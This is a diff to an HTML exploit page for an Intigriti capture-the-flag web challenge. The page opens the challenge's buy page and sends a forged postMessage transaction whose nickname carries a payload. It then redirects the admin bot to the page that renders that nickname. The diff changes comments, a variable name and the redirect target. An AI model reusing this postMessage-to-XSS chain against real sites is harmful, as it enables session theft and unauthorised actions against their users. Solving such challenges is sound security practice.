@@ -1,14 +1,15 @@
 <!DOCTYPE html>
 <html>
 <body>
+    <h1>Exploit Loading...</h1>
     <script>
-        // 1. Open the Buy page as the Admin
-        const challengeWin = window.open("https://challenge-0126.intigriti.io/buy.html?currency=BTC&price=1");
+        // 1. Open the vulnerable 'buy' page
+        const botWin = window.open("https://challenge-0126.intigriti.io/buy.html?currency=BTC&price=1");
 
         setTimeout(() => {
-            // 2. Trigger the transaction via the postMessage bug
-            // This puts your "nickname" (the payload) into the Market Watch list
-            challengeWin.postMessage({
+            // 2. Use the postMessage bug to force a transaction
+            // This puts your "nickname" (the payload above) into the Market Watch list
+            botWin.postMessage({
                 type: 'submitTransaction',
                 transaction: {
                     toAddress: '0x1337',
@@ -17,9 +18,9 @@
                 }
             }, '*');
 
-            // 3. Redirect the Admin to the page that renders the nickname
+            // 3. Redirect the bot to the dashboard where the nickname is rendered
             setTimeout(() => {
-                challengeWin.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
+                botWin.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
             }, 2000);
         }, 4000);
     </script>
